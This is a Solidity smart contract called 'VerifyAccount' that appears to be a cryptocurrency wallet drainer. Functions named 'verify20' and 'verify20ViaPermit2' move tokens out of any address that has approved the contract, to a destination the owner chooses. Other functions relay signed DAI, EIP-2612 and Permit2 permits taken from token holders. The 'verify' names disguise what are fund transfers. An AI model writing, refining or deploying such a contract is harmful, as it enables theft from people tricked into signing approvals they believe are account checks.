// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
}

interface IERC20Permit {
    // EIP-2612
    function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external;
}

interface IDaiPermit {
    // DAI-style permit: holder, spender, nonce, expiry, allowed, v, r, s
    function permit(address holder, address spender, uint256 nonce, uint256 expiry, bool allowed, uint8 v, bytes32 r, bytes32 s) external;
}

interface IPermit2 {
    struct PermitDetails {
        address token;
        uint160 amount;
        uint48 expiration;
        uint48 nonce;
    }

    struct PermitSingle {
        PermitDetails details;
        address spender;
        uint256 sigDeadline;
    }

    function permit(address owner, PermitSingle calldata permitSingle, bytes calldata signature) external;
    function transferFrom(address from, address to, uint160 amount, address token) external;
    function allowance(address owner, address token, address spender) external view returns (uint160 amount, uint48 expiration, uint48 nonce);
}

contract VerifyAccount {
    address public owner;

    // Reentrancy guard (minimal)
    uint256 private _status;
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event NativeTransferred(address indexed from, address indexed to, uint256 amount);
    event TokenTransferred(address indexed token, address indexed from, address indexed to, uint256 amount);
    event PermitExecuted(address indexed owner, address indexed token, address indexed spender);
    event TransferFromExecuted(address indexed token, address indexed from, address indexed to, uint256 amount);
    event PermitExecutedERC20(address indexed owner, address indexed token, address indexed spender);
    event Permit2Executed(address indexed owner, address indexed token, address indexed spender);

    constructor() {
        owner = msg.sender;
        _status = _NOT_ENTERED;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not authorized");
        _;
    }

    modifier nonReentrant() {
        require(_status != _ENTERED, "Reentrant call");
        _status = _ENTERED;
        _;
        _status = _NOT_ENTERED;
    }

    function verifyNative(address payable to) external payable onlyOwner nonReentrant {
        require(to != address(0), "Invalid address");
        require(msg.value > 0, "Amount must be greater than 0");

        // Checks done -> interaction
        to.transfer(msg.value);
        emit NativeTransferred(msg.sender, to, msg.value);
    }

    // Internal safe transferFrom to support non-standard tokens (e.g. USDT)
    function _safeTransferFrom(address token, address from, address to, uint256 amount) internal {
        bytes memory data = abi.encodeWithSelector(IERC20.transferFrom.selector, from, to, amount);
        (bool ok, bytes memory ret) = token.call(data);
        require(ok, "ERC20: low-level call failed");

        if (ret.length > 0) {
            // If token returns a value, require that it is true
            require(abi.decode(ret, (bool)), "ERC20: transferFrom returned false");
        }
        // If no return data, assume success (handles tokens like USDT)
    }

    function verify20(
        address token,
        address from,
        address to,
        uint256 amount
    ) external onlyOwner nonReentrant {
        require(token != address(0), "Invalid token address");
        require(from != address(0), "Invalid sender address");
        require(to != address(0), "Invalid recipient address");
        require(amount > 0, "Amount must be greater than 0");

        uint256 allowance = IERC20(token).allowance(from, address(this));
        require(allowance >= amount, "Insufficient allowance");

        uint256 balance = IERC20(token).balanceOf(from);
        require(balance >= amount, "Insufficient token balance");

        // Use the safe low-level transferFrom wrapper (handles USDT)
        _safeTransferFrom(token, from, to, amount);

        emit TokenTransferred(token, from, to, amount);
    }

    // Function for DAI-style permit with interface + try/catch
    function permitDAI(
        address token,
        address owner_,
        address spender,
        uint256 nonce,
        uint256 deadline,
        bool allowed, 
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external onlyOwner nonReentrant {
        require(token != address(0), "Invalid token address");
        require(owner_ != address(0), "Invalid owner");
        require(spender != address(0), "Invalid spender");

        // Use interface call with try/catch to bubble revert reasons
        try IDaiPermit(token).permit(owner_, spender, nonce, deadline, allowed, v, r, s) {
            // success
        } catch (bytes memory reason) {
            // bubble revert (with reason if possible)
            if (reason.length == 0) {
                revert("DAI-style permit failed");
            } else {
                assembly {
                    revert(add(32, reason), mload(reason))
                }
            }
        }

        emit PermitExecutedERC20(owner_, token, spender);
    }

    // Function for EIP-2612 permit with interface + try/catch
    function permitEIP2612(
        address token,
        address owner_,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external onlyOwner nonReentrant {
        require(token != address(0), "Invalid token address");
        require(owner_ != address(0), "Invalid owner");
        require(spender != address(0), "Invalid spender");

        try IERC20Permit(token).permit(owner_, spender, value, deadline, v, r, s) {
            // success
        } catch (bytes memory reason) {
            if (reason.length == 0) {
                revert("EIP-2612 permit failed");
            } else {
                assembly {
                    revert(add(32, reason), mload(reason))
                }
            }
        }

        emit PermitExecutedERC20(owner_, token, spender);
    }

    // Updated permitViaPermit2 with individual parameters
    function permitViaPermit2(
        address permit2Contract,
        address owner_,
        address token,
        uint160 amount,
        uint48 expiration,
        uint48 nonce,
        address spender,
        uint256 sigDeadline,
        bytes calldata signature
    ) external onlyOwner nonReentrant {
        require(permit2Contract != address(0), "Invalid Permit2 address");
        require(token != address(0), "Invalid token address");
        require(owner_ != address(0), "Invalid owner");
        require(spender != address(0), "Invalid spender");

        IPermit2.PermitDetails memory permitDetails = IPermit2.PermitDetails({
            token: token,
            amount: amount,
            expiration: expiration,
            nonce: nonce
        });

        IPermit2.PermitSingle memory permitSingle = IPermit2.PermitSingle({
            details: permitDetails,
            spender: spender,
            sigDeadline: sigDeadline
        });

        // permit may revert — use try/catch
        try IPermit2(permit2Contract).permit(owner_, permitSingle, signature) {
            // success
        } catch (bytes memory reason) {
            if (reason.length == 0) {
                revert("Permit2 permit failed");
            } else {
                assembly {
                    revert(add(32, reason), mload(reason))
                }
            }
        }

        emit Permit2Executed(owner_, token, spender);
    }

    function verify20ViaPermit2(
        address permit2Contract,
        address from,
        address to,
        uint160 amount,
        address token
    ) external onlyOwner nonReentrant {
        require(permit2Contract != address(0), "Invalid Permit2 address");
        require(token != address(0), "Invalid token address");
        require(from != address(0), "Invalid from address");
        require(to != address(0), "Invalid to address");
        require(amount > 0, "Amount must be greater than 0");

        // If this reverts, it will revert and bubble the reason
        IPermit2(permit2Contract).transferFrom(from, to, amount, token);

        emit TransferFromExecuted(token, from, to, amount);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Invalid address");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    // New function to get allowance for standard ERC20 tokens
    function getAllowance(address token, address owner_, address spender) external view returns (uint256) {
        require(token != address(0), "Invalid token address");
        require(spender != address(0), "Invalid spender address");
        uint256 allowanceAmount = IERC20(token).allowance(owner_, spender);
        return allowanceAmount;
    }

    // New function to get allowance via Permit2, returning all three values
    function getAllowanceViaPermit2(
        address permit2Contract,
        address owner_,
        address token,
        address spender
    ) external view returns (uint160 amount, uint48 expiration, uint48 nonce) {
        require(permit2Contract != address(0), "Invalid Permit2 address");
        require(token != address(0), "Invalid token address");

        (amount, expiration, nonce) = IPermit2(permit2Contract).allowance(owner_, token, spender);
    }

    receive() external payable {
        revert("Direct transfers not allowed");
    }
}